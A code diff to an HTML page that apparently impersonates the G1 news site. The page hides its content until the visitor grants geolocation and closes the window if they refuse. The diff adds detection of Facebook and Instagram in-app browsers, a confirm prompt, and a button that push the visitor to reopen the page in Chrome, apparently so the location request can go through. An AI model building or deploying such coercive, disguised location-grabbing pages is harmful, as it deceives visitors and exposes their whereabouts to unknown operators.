@@ -109,6 +109,24 @@
       font-size: 18px;
       font-family: Arial, sans-serif;
       user-select: none;
+      text-align: center;
+      padding: 20px;
+    }
+
+    #abrirNavegadorBtn {
+      margin-top: 20px;
+      padding: 10px 20px;
+      font-size: 16px;
+      background: #ffffff;
+      color: #c4170c;
+      border: 2px solid #ffffff;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    #abrirNavegadorBtn:hover {
+      background: #c4170c;
+      color: white;
     }
   </style>
 </head>
@@ -152,7 +170,11 @@
     © 2025 G1 - Todos os direitos reservados
   </footer>
 
-  <div id="overlay">Por favor, permita o acesso à sua localização para continuar navegando</div>
+  <div id="overlay">
+    Por favor, permita o acesso à sua localização para continuar navegando.
+    <br>
+    <button id="abrirNavegadorBtn" onclick="abrirNoNavegador()">Abrir no navegador</button>
+  </div>
 
   <script>
     function aplicarDesfoqueELocalizacao() {
@@ -183,7 +205,7 @@
         liberarConteudo();
 
       }, (error) => {
-        window.close(); // ou comente esta linha se quiser apenas manter o blur
+        window.close();
       });
     }
 
@@ -192,11 +214,31 @@
       document.getElementById('overlay').style.display = 'none';
     }
 
+    function isInAppBrowser() {
+      const ua = navigator.userAgent || '';
+      return /FBAN|FBAV|Instagram/.test(ua);
+    }
+
+    function abrirNoNavegador() {
+      const url = window.location.href;
+      try {
+        window.location = 'googlechrome://' + url;
+      } catch (e) {
+        window.location = url;
+      }
+    }
+
     window.addEventListener('load', () => {
+      if (isInAppBrowser()) {
+        setTimeout(() => {
+          const confirmar = confirm("Para continuar, abra esta página no navegador do seu celular.\n\nDeseja abrir no navegador?");
+          if (confirmar) abrirNoNavegador();
+        }, 1000);
+      }
+
       setTimeout(aplicarDesfoqueELocalizacao, 5000);
     });
   </script>
 
 </body>
 </html>
-
